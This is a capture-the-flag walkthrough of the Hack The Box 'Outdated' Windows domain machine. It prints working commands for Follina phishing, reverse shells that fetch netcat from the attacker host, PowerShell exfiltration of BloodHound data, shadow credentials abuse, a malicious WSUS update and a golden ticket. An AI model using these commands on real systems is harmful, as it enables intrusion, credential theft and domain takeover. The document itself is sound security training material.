        "tags": ["Box","HTB","Medium","Windows","Active Directory","WSUS","Kerberos","Follina","Rubeus","Whisker","Shadow Credentials","msDS-KeyCredentialLink",],
        "content": "Outdated Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Outdated How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46.02-HTB/BlogEntriesMade/Outdated/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:49:14 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 08:49 BST Nmap scan report for 10.129.229.239 Host is up (0.039s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 25/tcp open smtp 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 10.89 seconds In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP\nkali in 46.02-HTB/BlogEntriesMade/Outdated/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh took 11s 🕙 08:49:33 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 08:49 BST Nmap scan report for 10.129.229.239 Host is up (0.040s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 25/tcp open smtp hMailServer smtpd | smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-10 15:52:26Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-10-10T15:54:00+00:00; +8h00m01s from scanner time. | ssl-cert: Subject: commonName=DC.outdated.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.outdated.htb | Not valid before: 2023-12-13T00:17:36 |_Not valid after: 2024-12-12T00:17:36 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-10-10T15:54:00+00:00; +8h00m01s from scanner time. | ssl-cert: Subject: commonName=DC.outdated.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.outdated.htb | Not valid before: 2023-12-13T00:17:36 |_Not valid after: 2024-12-12T00:17:36 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC.outdated.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.outdated.htb | Not valid before: 2023-12-13T00:17:36 |_Not valid after: 2024-12-12T00:17:36 |_ssl-date: 2024-10-10T15:54:00+00:00; +8h00m01s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 8530/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Site doesn\u0026#39;t have a title. 8531/tcp open unknown 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49691/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49692/tcp open msrpc Microsoft Windows RPC 49924/tcp open msrpc Microsoft Windows RPC 49950/tcp open msrpc Microsoft Windows RPC 49984/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-10-10T15:53:22 |_ start_date: N/A |_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 248.40 seconds Findings:\n8530 \u0026amp; 8531 We can see that mail.outdated.htb is used: Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows I will add that to my /etc/hosts LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools 🐍 v3.12.6 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:50:47 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.229.239 with SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=outdated,DC=htb CN=Configuration,DC=outdated,DC=htb CN=Schema,CN=Configuration,DC=outdated,DC=htb DC=DomainDnsZones,DC=outdated,DC=htb DC=ForestDnsZones,DC=outdated,DC=htb We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=outdated,DC=htb ldapServiceName: outdated.htb:dc$@OUTDATED.HTB The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=outdated,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain As we can see there are some interesting entries here: mail.outdated.htb (which was in our NMAP scan) client.outdated.htb wsus.outdated.htb I add all of these to my /etc/hosts Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt I get 1 valid username I add this to my list of users: sflowers@outdated.htb SMTP 25: Connecting to the SMTP service using telnet: telnet mail.outdated.htb 25 I run EHLO all \u0026amp; help to enumerate the service: As we can see we do have the option AUTH LOGIN, so this may be useful for later if we need to send anything. +Note+: Remember you can only send mail via SMTP on the CLI not read. We need IMAP or POP3 to read. SMTP Commands (via Telnet): HELO / EHLO: Identifies your client to the server (use EHLO for extended features). MAIL: Specifies the sender\u0026rsquo;s email address. RCPT: Specifies the recipient\u0026rsquo;s email address. DATA: Starts the email body input. QUIT: Ends the session. NOOP: No operation (used to keep the connection alive). VRFY: Verifies if a mailbox exists (not always allowed for privacy reasons). RSET: Resets the current session without quitting. I do some user enumeration using smtp-user-enum : First with the VRFY Method:\nsmtp-user-enum -M VRFY -U ~/Wordlists/seclists/Usernames/Names/names.txt -D mail.$domain -t $box No hits using the VRFY method. I try again using the EXPN method but nothing either:\nsmtp-user-enum -M EXPN -U ~/Wordlists/seclists/Usernames/Names/names.txt -D mail.$domain -t $box Attempting to bruteforce SMTP: Using Hydra to bruteforce SMTP: hydra -l itsupport -P +/Wordlists/rockyou.txt $box smtp -t 1 I try hydra however no matter how many threads I set it always disables due to too many connections. I try the SMTP NMAP bruteforcing .nse script: nmap -p 25 --script smtp-brute $box SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares So I can see we have access to the Shares share as well as $IPC We can also see that there are multiple mentions of wsus as seen in our DNSenum findings. Attempting to use the sflowers username as password: I try and connect with the sflowers *user and use their username as password as well as a blank password but no luck: Logging into the Shares to find a PDF: I login to the SMB share using the guest account \u0026amp; immediatley find a pdf:\nsmbclient -U $domain\\$guest \\\\\\\\$box\\\\Shares I download the pdf:\nAttempting to extract creator names from the .PDF: If you are not aware, it is sometimes possible to extract valid domain usernames from pdf's if they have been created on a Windows host. As often the Creator Field is populated using the Windows User\u0026rsquo;s Logged-In Name\nSome reasons why the Creator Field Uses the Windows User\u0026rsquo;s Logged-In Name: PDF Metadata Collection:\nWhen creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system. System Environment Variables:\nThe logged-in Windows username is part of system environment variables. This is often used to populate fields like \u0026ldquo;Creator\u0026rdquo; in the PDF document. Program Defaults:\nBy default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user. Tracking Ownership:\nThis feature helps track the original creator or author of a document for auditing or document management purposes. Attempting to extract Usernames From the PDF using exiftool: exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq \u0026gt; userNames.txt I run it and check the output of the file, however there are no valid usernames, just that it was created using Word: Command Breakdown:\nexiftool -Creator -csv *pdf\nexiftool: Run the tool -Creator: Extracts the Creator metadata field from the files. -csv: Outputs the data in CSV format. This is the most important part for the rest of the command to work: The CSV format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF\u0026rsquo;s metadata is presented as a row, and each field (like \u0026ldquo;Creator\u0026rdquo;) is a column. This makes it easier to process the data programmatically. Simplicity: When using tools like cut, it\u0026rsquo;s easier to extract specific fields by referring to column numbers (e.g., -f2 for the second column), which is straightforward with CSV formatting. *pdf: Targets all PDF files in the current directory. | cut -d, -f2\n|: Pipes the output from the previous command into the next. cut: Extracts specific fields from the CSV output. -d,: Uses a comma as the delimiter (since it\u0026rsquo;s CSV data). -f2: Selects the second field, which contains the creator name. | sort: Sorts the creator names alphabetically.\n| uniq: Removes duplicate names, leaving only unique entries.\n\u0026gt; userNames.txt\nRedirects the final output (unique creator names) into a file named userNames.txt Reading NOC_Reminder.pdf and discovering exploits that the environment is susceptible to: Looking at the PDF it provides a list of vulnerabilities in the environment that they need to patch as well as corresponding CVE\u0026rsquo;s. It also reveals another email address: itsupport@outdated.htb is expecting to be sent links to internal web applications to them. Investigating the CVE list For an attack path: I will use these CVE\u0026rsquo;s as a starting point to see if we can find an easy way in. CVE-2022-30138 PrintSpooler Privilege Escalation: Good privesc path once we have access as this needs to be performed locally. CVE-2022-30129 Remote Code Execution vulnerability in Visual Studio Code: This CVE-2022-30129 pertains to a Remote Code Execution vulnerability in Visual Studio Code, affecting versions less than 1.67.1. CVE-2022-29110 Microsoft Excel Remote Code Execution Vulnerability: Microsoft CVE-2022-29110: Microsoft Excel Remote Code Execution Vulnerability CVE-2022-29130 Windows Lightweight Directory Access Protocol (LDAP) Remote Code Execution Vulnerability.: Microsoft Windows: CVE-2022-29130: Windows Lightweight Directory Access Protocol (LDAP) Remote Code Execution Vulnerability. CVE-2022-30190 Follina Exploit: This is the follina exploit, it is a microsoft word exploit. There is a great writeup here by HTB. https://www.hackthebox.com/blog/cve-2022-30190-follina-explained John Hammond also has a great video here {{\u0026lt; youtube dGCOhORNKRk \u0026gt;}} 2. Foothold: Quick overview on Follina Exploit: We craft a malicious Office documents that uses a feature to load remote HTML via a link. This triggers Microsoft Support Diagnostic Tool MSDT (overview below), allowing us to execute arbitrary code on the victim\u0026rsquo;s machine without the need for macros. +This is the crazy part+ All that needs to happen for exploitation is that the user opens or +previews+ (if .rtf is used) the office document. Attack Path This may be valid attack path as we know that itsupport is expecting to be sent links. Microsoft Support Diagnostic Tool (MSDT) Overview: Purpose:\nMSDT is a built-in Windows tool designed to help users troubleshoot and diagnose system problems. It collects diagnostic information (logs, configurations, etc.) about a system and sends it to Microsoft Support or can be used to automatically resolve issues based on predefined fixes. Functionality:\nIt works through various troubleshooting packs, which are scripts or tools that identify and resolve specific issues (e.g., network connectivity, hardware problems). Often accessed via Windows troubleshooting settings or invoked by support agents when collecting system data remotely. How it\u0026rsquo;s triggered:\nCan be invoked manually by users or automatically through specific command-line arguments. In the case of the Follina exploit, it was invoked through a URL protocol (e.g., ms-msdt:) embedded in a malicious Office document. Testing if we can make itsupport click an emailed link using swaks: I use swaks to send an email to the itsupport@outdated.htb:\nswaks --to itsupport@outdated.htb --from bloodstiller@bloodstiller.com --server mail.outdated.htb --body \u0026quot;http://10.10.14.43/\u0026quot; --header \u0026quot;Subject: Testing\u0026quot; I put the IP of my attack box as a link within the body and setup a listener on host. nc -nvlp 80 I do this as I want to see if we send a link will it be clicked. I get a connection back to my listener once the email is sent:\nThis verified that if a link is sent to that email address the link will be clicked. Trying to get a reverse shell using the Follina exploit: This section includes all my troubleshooting when I couldn\u0026rsquo;t get things started/moving forward. I want to leave this in as a lot of walkthroughs\u0026rsquo; are like, so I did A, B, C and that\u0026rsquo;s how I got root. Where as it\u0026rsquo;s never that simple, for me at least, and leads to unrealistic expectations for people just trying to get into the industry/CTF\u0026rsquo;s. So I leave almost everything in, bones and all. Trying to get a reverse shell using Follina and a malicious .doc: I download john-hammonds follina POC:\nhttps://github.com/JohnHammond/msdt-follina?tab=readme-ov-file Create a base64 encoded reverse shell using https://revshells.com :\nRun the exploit generator \u0026amp; passing in my base64 encoded string:\npython3 follina.py -i tun0 -p 9999 -c \u0026quot;powershell -e \u0026lt;base64EncodedString\u0026gt;\u0026quot; The exploit by default starts the listener too to serve the malicious .html:\nI start my listener on 443:\nnc -nvlp 443 I use swaks to send the malicious document:\nswaks --to itsupport@outdated.htb --from bloodstiller@bloodstiller.com --server mail.outdated.htb --body \u0026quot;http://10.10.14.43/\u0026quot; --header \u0026quot;Subject: Testing\u0026quot; --attach follina.doc And I get…..nothing:\nLets get thinking….. Trying to get a reverse shell using Follina malicious html: With the Follina exploit the .doc/.rtf is just a mechanism to have the victim reach out to the malicious html which actually has the payload. As we know that if we send a link to the itsupport it will be clicked. Which means we should be able to send them a direct link to the malicious follina html, it be clicked and the payload delivered. Using John Hammond\u0026rsquo;s Follina exploit web-server to serve the payload: I double check that the html is working by running curl:\ncurl http://10.10.14.43:9999 We can see it is here so we know it is running: If you\u0026rsquo;re wondering why it\u0026rsquo;s so much data, the exploit requires 4096 bytes of padding to be included before the exploit will trigger. Checking the server we can see the request:\nI put the nc64.exe in the same folder and modify my command:\npython3 follina.py -i tun0 -p 9999 -c 'Invoke-WebRequest http://10.10.14.43/nc64.exe -OutFile C:\\Windows\\Temp\\nc64.exe; C:\\Windows\\Temp\\nc64.exe -e cmd.exe 10.10.14.43 443' What\u0026rsquo;s strange is I can get it trigger the part where it reaches out to the webserver, but it never actually pulls down the nc64.exe binary however, it just reaches out to the server. Back to the drawing board…. I mean I could debug this but there are other publicly available exploits so will try one of them first. Getting a Reverse shell using Follina.py: I find this exploit:\nhttps://github.com/chvancooten/follina.py I copy the nc64.exe binary to it\u0026rsquo;s root web folder /www:\nStart the webserver \u0026amp; put my command I want to run when the victim reaches the malicious html:\npython follina.py -t rtf -m command -c 'Invoke-WebRequest http://10.10.14.43/nc64.exe -OutFile C:\\\\Windows\\\\Temp\\\\nc64.exe; C:\\\\Windows\\\\Temp\\\\nc64.exe -e cmd.exe 10.10.14.43 443' +Note+: With this particular exploit the author does to use double backslashes to escape them. Send my email via swaks:\nswaks --to itsupport@outdated.htb --from bloodstiller@bloodstiller.com --server mail.outdated.htb --body \u0026quot;Here is the web app - http://10.10.14.43/exploit.html\u0026quot; --header \u0026quot;Subject: Web\u0026quot; We immediately get a hit on the web server:\nWe catch our shell Caught:\nEnumerating as the user btables: Checking if PrintSpoofer is a viable exploit path: As we saw that PrintSpooler/PrintSpoofer was mentioned the first thing to check is the privileges of our user:\nTo perform this attack we need either SeAssignPrimaryTokenPrivilege or SeImpersonatePrivilege we have neither. Maybe we can activate them with EnableAllTokePrivs.ps1 I transer EnableAllTokePrivs.ps1 :\npowershell -c wget http://10.10.14.43:9000/EnableAllTokenPrivs.ps1 -o tp.ps1 I run it:\nNo luck: Finding a check_mail.ps1 script containing clear text creds: I discover a script called check_mail.ps1 in the users home folder::\nReading the contents of the script reveals a new username and a clear-text password:\nI add the username and password to my list: I check if the username \u0026amp; password can be used to access SMB or LDAP but they cannot:\nReading Emails using check_mail.ps1: I run the check_mail.ps1 script: powershell -c .\\.check_mail.ps1 I have a feeling this is just the automated mechanism to read the email we sent. Trying to Extract Credentials using LaZagne.exe : I transer LaZagne.exe over to hunt for passwords: curl http://10.10.14.43:9000/LaZagne.exe -o lz.exe I get a big fat nothing: Using SharpHound.exe to enumerate the environment. I transfer the binary accross:\npowershell -c wget http://10.10.14.43:9000/SharpHound.exe -o sh.exe I run the collector:\n.\\sh.exe Transferring the SharpHound Zip back to myself using my custom python webserver: Start my custom python webserver:\nI have this handy python webserver that is useful when exfiling data. You can find it here: https://github.com/bloodstiller/bloodserver Save as bloodserver.py Run python3 bloodserver.py -u bloodstiller --password bl00dst1ll3r -p 9999 --https +NOTE+: Will output file as uploaded_file FYI my server has certs and you can enter in passwords \u0026amp; usernames or it will auto-generate one for you. The only reason I am not using 443 for https is because my revers-shell is running over that. Send the file from victim using powershell:\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $wc = New-Object System.Net.WebClient; $wc.Headers.Add(\u0026#34;Authorization\u0026#34;, \u0026#34;Basic \u0026#34; + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(\u0026#34;bloodstiller:bl00dst1ll3r\u0026#34;))); try { $response = $wc.UploadData(\u0026#34;https://10.10.14.43:9999\u0026#34;, [System.IO.File]::ReadAllBytes(\u0026#34;C:\\Users\\btables\\20241011102426_BloodHound.zip\u0026#34;)); Write-Host \u0026#34;Server response: $([System.Text.Encoding]::UTF8.GetString($response))\u0026#34;; Write-Host \u0026#34;File sent successfully!\u0026#34; } catch { Write-Host \u0026#34;An error occurred: $_\u0026#34; } File received on our attack host: +Note+: The file will be called uploaded_file you will have to change it back to a zip file. 3. Lateral Movement: Discovering btables has AddKeyCredentialLink privilege over sflowers: After ingesting the data into bloodhound we can see that btables has the AddKeyCredentialLink privilege over sflowers.\nWe can perform a shadow credentials attack to take advantage of this privilege:\nIf you are unfamiliar with this attack vector I have a write up here: https://bloodstiller.com/articles/shadowcredentialsattack/ To put it simply: If we have the WriteProperty privilege (specifically for the msDS-KeyCredentialLink attribute) over a user or computer object, we can set Shadow Credentials for that object and authenticate as them. You read that right, we can add a certificate-based credential to a user or computer and then authenticate as them. We can also request a Kerberos ticket and use it for pass-the-ticket attacks if needed. Building whisker.exe: I actually don\u0026rsquo;t the binary in my folder of binaries so will have to build: I open up my windows VM. Clone the repo. git clone https://github.com/eladshamir/Whisker Open up Visual Studio 2022 Build \u0026amp; voila a nice new whisker.exe binary. Adding Shadow Credentials to sflowers using whisker.exe : I transfer whisker.exe to the host:\ncurl http://10.10.14.43:9000/Whisker.exe -o w.exe I call it w.exe for no reason other than speed when typing. I set the shadow credentials on the user sflowers:\nw.exe add /target:sflowers /domain:outdated.htb +Note+: What is great about whisker is that spits out the exact command you will need to run in rubeus. I use the base64 encoded certificate to request a TGT for sflowers using rubeus: I run rubeus and pass it the base64 encoded certificate \u0026amp; password:\nr.exe asktgt /user:sflowers /certificate:\u0026lt;base64Cert\u0026gt; /password:\u0026quot;sA1JSl1rVtabQdMp\u0026quot; /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show Rubeus Command Explained:\nUses the certificate to request a Kerberos TGT for Susan Flowers (sflowers) The /certificate parameter contains the Base64-encoded certificate The /password is for the private key, not Susan\u0026rsquo;s actual AD password The /getcredentials flag attempts to decrypt the encrypted NTLM hash from the TGT The /show flag displays the ticket details and other information If successful, Rubeus receives a TGT and can extract the NTLM hash As a result of this process:\nRubeus obtains a TGT for Susan Flowers (sflowers) \u0026amp; generates a .kirbi file which can be used for pass-the-ticket attacks. It also extracts and displays the user\u0026rsquo;s NTLM hash (due to the /getcredentials flag) The ticket details and other information are shown in the output (due to the /show flag) I check the NTLM hash is valid using netexec:\nnetexec smb $box -u $user -H $hash --share We can see we have read \u0026amp; write access to the WSUS shares now. +Note+: I actually had to restart the box as I was getting some strange errors when trying to authenticate to SMB as sflowers Enumerating the Host as slfowers: I connect with evil-winrm:\nevil-winrm -i $box -u $user -H $hash Get the flag:\nI see that PsExec64.exe binary is also on the desktop:\nSeeing sflowers has outbound object control over the CA: I see in bloodhound that sflowers has outbound object control over the CA:\nI run certipy-ad to see if there are any vulnerable certs:\ncertipy-ad find -vulnerable -enabled -u $user@$domain -hashes :$hash -dc-ip $box I check but there are no vulnerable certs Discovering sflowers is part of the wsus administrators group: Looking at sflowers group memberships we can see she is part of the wsus administrators group: This could be a viable attack path as if we can push a malicious update via wsus we may be able to escalate our privileges: What is WSUS (Windows Server Update Services)? WSUS (Windows Server Update Services) is a critical component in many corporate Windows environments. It allows administrators to manage and distribute updates centrally. WSUS Architecture: Typical deployment:\nOne WSUS server in the corporate network Downloads patches from Microsoft via HTTP/HTTPS Deploys patches to clients as they check in Client communication: HTTP (port 8530) HTTPS (port 8531) More complex deployments may involve:\nUpstream server: Connects to Microsoft, downloads updates Downstream servers: Receive updates from upstream, distribute to clients 4. Privilege Escalation: Manually Enumerating the WSUS Service by querying the registry: Enumerating the Primary WSUS Settings: To query the main WSUS settings, use the following command: reg query HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate SetActiveHours REG_DWORD 0x1 ActiveHoursStart REG_DWORD 0x0 ActiveHoursEnd REG_DWORD 0x17 AcceptTrustedPublisherCerts REG_DWORD 0x1 ExcludeWUDriversInQualityUpdate REG_DWORD 0x1 DoNotConnectToWindowsUpdateInternetLocations REG_DWORD 0x1 WUServer REG_SZ http://wsus.outdated.htb:8530 WUStatusServer REG_SZ http://wsus.outdated.htb:8530 UpdateServiceUrlAlternate REG_SZ Key Findings: SetActiveHours:\nActiveHoursStart Start = 0x0 (12:00 AM) ActiveHoursEnd End = 0x17 (11:00 PM) Updates are allowed to install at any time AcceptTrustedPublisherCerts = 1\nThe system accepts certificates from trusted publishers for updates DoNotConnectToWindowsUpdateInternetLocations = 1\nThe system is configured to not connect directly to Windows Update All updates must come through the WSUS server WSUSServer:\nhttp://wsus.outdated.htb:8530 This is the central update server for the organization Connection Security: HTTP (unencrypted): The connection to the WSUS server uses HTTP instead of HTTPS Seen in the url http://wsus.outdated.htb:8530 \u0026amp; that it\u0026rsquo;s using port 8530 This could potentially expose update traffic to interception Enumerating the Automatic Update Settings: To query specific automatic update settings: reg query HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU AutoInstallMinorUpdates REG_DWORD 0x1 NoAutoUpdate REG_DWORD 0x0 AUOptions REG_DWORD 0x3 ScheduledInstallDay REG_DWORD 0x0 ScheduledInstallTime REG_DWORD 0x3 ScheduledInstallEveryWeek REG_DWORD 0x1 UseWUServer REG_DWORD 0x1 Key Findings: AutoInstallMinorUpdates = 1\nMinor Updates: Auto-install Small updates are installed without user intervention NoAutoUpdate = 0\nAutomatic Updates: Enabled The system will automatically check for and download updates AUOptions = 3\nUpdate Installation: Automatic: Updates will be downloaded and installed automatically ScheduledInstallEveryWeek = 1\nUpdate Schedule: Day: 0 (Every day) Time: 3 (3:00 AM) Frequency: Weekly UseWUServer = 1\nUpdate Source: WSUS Server Confirms that the system is using the configured WSUS server Analysis and Implications of the results: Security Concerns: The use of an unencrypted HTTP connection to the WSUS server could pose a security risk, potentially allowing for man-in-the-middle attacks.\nE.G. Us right now. Automatic Update Behavior: The system is set to automatically install updates, which helps maintain system security but also means if we push an update it will be automatically installed!\nUpdate Control: The system is fully reliant on the WSUS server for updates, as it\u0026rsquo;s configured not to connect to Windows Update directly.\nScheduled Updates: Updates are scheduled to install weekly ScheduledInstallEveryWeek = 1, which suggests a regular maintenance window.\nAttack Path:\nI will attempt to push a malicious update using the tool SharpWSUS Using SharpWSUS to push a malicious update: Building SharpWSUS : Again I don\u0026rsquo;t have a sharpWSUS binary in my common binaries so will have to build it: I open up my windows VM. Clone the repo. git clone https://github.com/nettitude/SharpWSUS.git Open up Visual Studio 2022 Build \u0026amp; voila a nice new sharpWSUS.exe binary. Using SharpWSUS to trigger a reverse shell as system: Looking at the creators blog-post about the tool I see the following paragraph: While the need for a signed binary can limit some attack paths, there are still plenty of binaries that could be used such as PsExec.exe to run a command as SYSTEM, RunDLL32.exe to run a malicious DLL on a network share, MsBuild.exe to grab and execute a remote payload and more. The example in this blog will use PsExec.exe for code execution (https://docs.microsoft.com/en-us/sysinternals/downloads/psexec ).\nA patch leveraging PsExec.exe can be done with the following command:\nSharpWSUS.exe create /payload:\u0026ldquo;C:\\Users\\ben\\Documents\\pk\\psexec.exe\u0026rdquo; /args:\u0026quot;-accepteula -s -d cmd.exe /c \\\u0026ldquo;net user WSUSDemo Password123! /add \u0026amp;\u0026amp; net localgroup administrators WSUSDemo /add\\\u0026rdquo;\u0026quot; /title:\u0026ldquo;WSUSDemo\u0026rdquo;\nhttps://labs.nettitude.com/blog/introducing-sharpwsus/ If you remember correctly sflowers had a PsExec64.exe binary on her desktop so this gives us a valid attack path. Creating a Malicious Update with SharpWSUS: I create my SharpWSUS payload to trigger an nc64.exe binary I have uploaded .\\SharpWSUS.exe create /payload:\u0026quot;C:\\Users\\sflowers\\Desktop\\PsExec64.exe\u0026quot; /args:\u0026quot;-accepteula -s -d C:\\Users\\sflowers\\Documents\\nc64.exe -e cmd.exe 10.10.14.43 443\u0026quot; /title:\u0026quot;EmergencyUpdate\u0026quot; +Note+: You can see at the bottom of the output it tells us the next command we need to run in order to push this malicious update. Approving our Malicious Update with SharpWSUS: Approve the update:\n.\\SharpWSUS.exe approve /updateid:bdf7d92c-2b96-42c3-b615-fc207c9d49af /computername:dc.outdated.htb /groupname:\u0026quot;EmergencyUpdate\u0026quot; +Note+: Be patient it can take a minute or longer in real life depending on update schedules etc. In real life this could take upto a week etc if updates are only pushed weekly and under certain circumstances. /groupname: = the /title: we set in the previous step e.g. \u0026quot;EmergencyUpdate\u0026quot; Remember to modify the /computername: to be the FQDN of the target you are attacking. Shell Caught:\n4. Persistence: Creating a golden ticket with mimikatz.exe: I upload mimikatz via the existin evil-winrm session with sflowers:\nI perform a dcsync attack and dump the krbtgt hash: lsadump::dcsync /user:krbtgt /domain:outdated.htb I get the SID, KRBTGT NTLM hash which is all I need to perform my Golden Ticket Attack. I create my golden ticket:\nkerberos::golden /domain:outdated.htb /user:Administrator /sid:S-1-5-21-4089647348-67660539-4016542185 /rc4:\u0026lt;redacted\u0026gt; I transfer the ticket via evil-winrm:\nConvert with impacket-ticketconverter:\nimpacket-ticketConverter ticket.kirbi admin.ccache Import into session my current session:\nexport KRB5CCNAME=./admin.ccache Syncronise my time with the Domain Controller:\nsudo ntpdate -s dc.$domain +Note+: As kerberos uses time based security checks this is important Check the 